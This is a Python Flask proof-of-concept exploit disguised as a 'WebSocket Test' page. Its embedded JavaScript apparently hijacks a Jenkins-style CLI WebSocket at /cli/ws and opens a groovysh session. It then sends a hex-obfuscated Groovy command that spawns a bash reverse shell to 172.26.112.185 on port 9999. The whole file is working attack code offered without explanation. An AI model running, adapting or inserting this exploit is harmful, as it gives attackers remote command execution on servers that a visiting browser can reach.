from flask import Flask, render_template_string

app = Flask(__name__)

@app.route('/')
def index():
    # Define the HTML page with embedded JavaScript
    html_content = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>WebSocket Test</title>
        <script>
            // Set the WebSocket URL and origin
            const url = "ws://localhost:8080/cli/ws";  // Change this to your WebSocket URL
            const originHeader = "http://localhost:8080";  // Change this to the correct origin if needed

            // Create a new WebSocket connection
            const ws = new WebSocket(url);

            // Converts Attack's IP to UTF-8
            function ipToHexArray(ipString) {
                // Convert the IP string into an array of ASCII codes
                const hexArray = new Uint8Array(ipString.length);
                for (let i = 0; i < ipString.length; i++) {
                    hexArray[i] = ipString.charCodeAt(i);
                }
                return hexArray;
            }

            // When the WebSocket connection is open, execute this callback
            ws.onopen = function() {
                console.log("Connected");


                // Example usage
                const ip = "172.26.112.185";
                const IP_encoded = ipToHexArray(ip);
                console.log(IP_encoded);

                // Define the start and end frames
                const command_hex = new Uint8Array([
                0x00, 0x00, 0x63, 0x5b, 0x27, 0x62, 0x61, 0x73, 0x68, 0x27, 0x2c, 0x20, 0x27, 0x2d, 0x63, 0x27,
                0x2c, 0x20, 0x27, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x20, 0x2d, 0x63, 0x20,
                0x5c, 0x27, 0x62, 0x61, 0x73, 0x68, 0x20, 0x2d, 0x69, 0x20, 0x3e, 0x26, 0x20, 0x2f, 0x64, 0x65,
                0x76, 0x2f, 0x74, 0x63, 0x70, 0x2f, ...IP_encoded,
                0x2f, 0x39, 0x39, 0x39, 0x39, 0x20, 0x30, 0x3e, 0x26, 0x31, 0x5c, 0x27,
                0x27, 0x5d, 0x2e, 0x65, 0x78, 0x65, 0x63, 0x75, 0x74, 0x65, 0x28, 0x29, 0x2e, 0x77, 0x61, 0x69,
                0x74, 0x46, 0x6f, 0x72, 0x28, 0x29
                ]);
                console.log(command_hex);

                ws.send(new Uint8Array([0x00, 0x00, 0x08, 0x67, 0x72, 0x6f, 0x6f, 0x76, 0x79, 0x73, 0x68]));
                console.log("Start signal sent");

                ws.send(command_hex);
                console.log("Command sent");

                ws.send(new Uint8Array([0x02, 0x00, 0x05, 0x55, 0x54, 0x46, 0x2d, 0x38]));

                ws.send(new Uint8Array([0x01, 0x00, 0x05, 0x65, 0x6e, 0x5f, 0x55, 0x53]));

                // Send the start signal (0x03) as a separate binary frame
                ws.send(new Uint8Array([0x03]));
                console.log("Start signal sent");

                // Start listening for responses
                let i = 0;
                ws.onmessage = function(event) {
                    // Decode the response if it's in binary format (assuming UTF-8 encoded text)
                    const decoder = new TextDecoder('utf-8');
                    const decodedMessage = decoder.decode(event.data);

                    // Print the decoded message to the console
                    console.log(`Message ${i}: ${decodedMessage}`);
                    i += 1;
                };

                // Handle connection closure
                ws.onclose = function() {
                    console.log("Connection closed");
                };
            };

            // Handle errors
            ws.onerror = function(error) {
                console.error("WebSocket error:", error);
            };
        </script>
    </head>
    <body>
        <h1>WebSocket Connection Test</h1>
        <p>Open your browser's console to see WebSocket interactions.</p>
    </body>
    </html>
    """

    # Render the HTML content as the response
    return render_template_string(html_content)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
